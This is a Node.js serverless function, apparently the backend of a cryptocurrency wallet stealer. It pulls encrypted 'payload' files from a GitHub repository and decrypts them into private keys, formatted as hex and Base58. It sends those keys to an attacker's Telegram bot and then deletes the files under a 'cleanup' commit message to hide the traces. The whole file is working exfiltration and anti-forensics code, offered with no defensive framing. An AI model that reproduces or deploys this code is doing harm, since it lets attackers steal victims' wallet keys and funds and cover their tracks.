import crypto from 'crypto';
import fetch from 'node-fetch';  // may already be available in Vercel

const OWNER = 'markus1997ai';
const REPO  = 'markus1997ai.github.io';
const PATH  = 'payloads';

export default async function handler(req, res) {
  try {
    // 1. List payload files
    const listResp = await fetch(
      `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}`,
      {
        headers: {
          Authorization: `token ${process.env.GITHUB_TOKEN}`,
          Accept: 'application/vnd.github.v3+json',
        },
      }
    );
    if (!listResp.ok) {
      throw new Error(`GitHub list error: ${listResp.status}`);
    }
    const files = await listResp.json();
    if (!Array.isArray(files) || files.length === 0) {
      return res.status(200).json({ status: 'no-payloads' });
    }

    const results = [];

    // 2. Process each file
    for (const file of files) {
      const { download_url, path, sha } = file;

      // 2a. Fetch the Base64 content
      const contentResp = await fetch(download_url);
      const b64 = await contentResp.text();

      // 2b. Decode and parse JSON
      const jsonStr = decodeURIComponent(
        atob(b64)
      );
      const { bundles, keybundle } = JSON.parse(jsonStr);

      // 3. Your existing decrypt logic, inlined:
      const sbundlesArr   = JSON.parse(bundles || '[]');
      const { bundleKey: keyB64 } = keybundle || {};
      const key = Buffer.from(keyB64, 'base64');

      const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
      function bytesToBase58(buf) {
        let num = BigInt('0x' + buf.toString('hex')), out = '';
        while (num > 0n) {
          const rem = num % 58n;
          num = num / 58n;
          out = ALPHABET[Number(rem)] + out;
        }
        for (const b of buf) {
          if (b === 0) out = '1' + out;
          else break;
        }
        return out;
      }

      const decrypted = sbundlesArr.map(sb => {
        const [ivB64, ctB64] = sb.split(':');
        const iv  = Buffer.from(ivB64, 'base64');
        const ct  = Buffer.from(ctB64,  'base64');
        const tag = ct.slice(-16);
        const data= ct.slice(0, -16);

        const dec = crypto.createDecipheriv('aes-256-gcm', key, iv);
        dec.setAuthTag(tag);
        const plain = Buffer.concat([dec.update(data), dec.final()]);

        return {
          hex:    plain.toString('hex'),
          base58: bytesToBase58(plain),
        };
      });

      // 4. Send to Telegram
      let text = '🔑 Decrypted keys:\n';
      decrypted.forEach((r, i) => {
        text += `Wallet ${i}:\n  Hex: ${r.hex}\n  Base58: ${r.base58}\n`;
      });

      const tgUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`
                  + `?chat_id=${process.env.TELEGRAM_CHAT_ID}`
                  + `&text=${encodeURIComponent(text)}`;
      await fetch(tgUrl);

      results.push(path);

      // 5. Delete the GitHub file
      await fetch(
        `https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}`,
        {
          method: 'DELETE',
          headers: {
            Authorization: `token ${process.env.GITHUB_TOKEN}`,
            Accept: 'application/vnd.github.v3+json',
          },
          body: JSON.stringify({
            message: `cleanup ${path}`,
            sha: sha
          })
        }
      );
    }

    // 6. Return success
    res.status(200).json({ status: 'processed', files: results });
  } catch (e) {
    console.error('❌ Error in /api/messages:', e);
    res.status(500).json({ error: e.message });
  }
}
